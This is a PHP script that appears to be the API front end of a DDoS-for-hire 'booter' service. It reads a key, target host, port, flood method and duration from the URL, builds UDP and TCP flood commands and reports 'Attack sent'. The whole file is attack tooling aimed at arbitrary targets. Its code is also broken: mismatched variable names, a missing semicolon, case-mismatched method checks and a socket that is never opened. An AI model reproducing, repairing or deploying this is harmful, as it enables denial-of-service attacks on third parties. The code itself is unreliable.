<?php
error_reporting(E_ALL);
    $APIKEYS = "ih4t3u";
    $attackMethods = array("udp-strong", "hex-flood", "strong-hex", "nudp", "udphex", "socket-raw", "samp", "tcp-mix");

    function htmlsc($string)
    {

        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");

    }
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))

        die("You are missing a parameter");

    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $time = htmlsc($_GET["time"]);
    $command = "";

    if (!in_array($key, $APIKeys)) die("Invalid API key");
    if (!in_array($method, $attackMethods)) die("Invalid attack method")
    if ($method == "udp-strong") $command = "udp-strong $host $time port=$port\r\n";
    else if ($method == "hex-flood") $command = "hex-flood $host $time port=$port size=1400\r\n";
	  else if ($method == "strong-hex") $command = "strong-hex $host $time port=$port\r\n";
	  else if ($method == "nudp") $command = "nudp $host $time port=$port\r\n";
	  else if ($method == "udphex") $command = "udphex $host $time port=$port\r\n";
      else if ($method == "socket-raw") $command = "socket-raw $host $time port=$port\r\n";
    else if ($method == "samp") $command = "samp $host $time port=$port\r\n";
    else if ($method == "tcp-mix") $command = "tcp-mix $host $time port=$port\r\n";
  
    ($socket ? null : die("Failed to connect"));
	fwrite($socket, " \r\n"); // Leave This.
	sleep(3);
 
	sleep(3);
 
    sleep(9);
    fwrite($socket, $command);
    fclose($socket);
    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
	
?>